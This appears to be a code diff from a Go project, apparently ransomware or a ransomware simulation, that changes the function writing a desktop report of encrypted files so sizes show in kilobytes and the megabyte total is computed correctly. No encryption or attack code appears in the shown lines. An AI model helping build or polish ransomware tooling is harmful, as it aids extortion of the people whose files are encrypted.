@@ -108,6 +108,7 @@ func GetDrives() []string {
 
 func GenerateDesktopFiles(encryptedList []FileInfo, startTime time.Time) error {
 
+	var t time.Time = time.Now()
 	var text string = "------ENCRYPTED FILES------\n\n"
 	var totalSize int = 0
 	var megaBytes string
@@ -117,14 +118,14 @@ func GenerateDesktopFiles(encryptedList []FileInfo, startTime time.Time) error {
 	}
 
 	for _, info := range encryptedList {
-		text = text + info.Path + " " + strconv.Itoa(info.Size) + " bytes\n"
+		kiloBytes := strconv.FormatFloat(float64(info.Size)/1000, 'f', 2, 64)
+		text = text + info.Path + " " + kiloBytes + " kB\n"
 		totalSize = totalSize + info.Size
 	}
 
-	t := time.Now()
 	elapsedTime := t.Sub(startTime)
 
-	megaBytes = strconv.FormatFloat(float64(totalSize)/1000, 'f', 2, 64)
+	megaBytes = strconv.FormatFloat(float64(totalSize)/1000000, 'f', 2, 64)
 
 	text = text + "\n" + "TOTAL SIZE: " + megaBytes + " MB"
 	text = text + "\n" + "TIME ELAPSED: " + strconv.FormatFloat(elapsedTime.Seconds(), 'f', 4, 64) + " s"
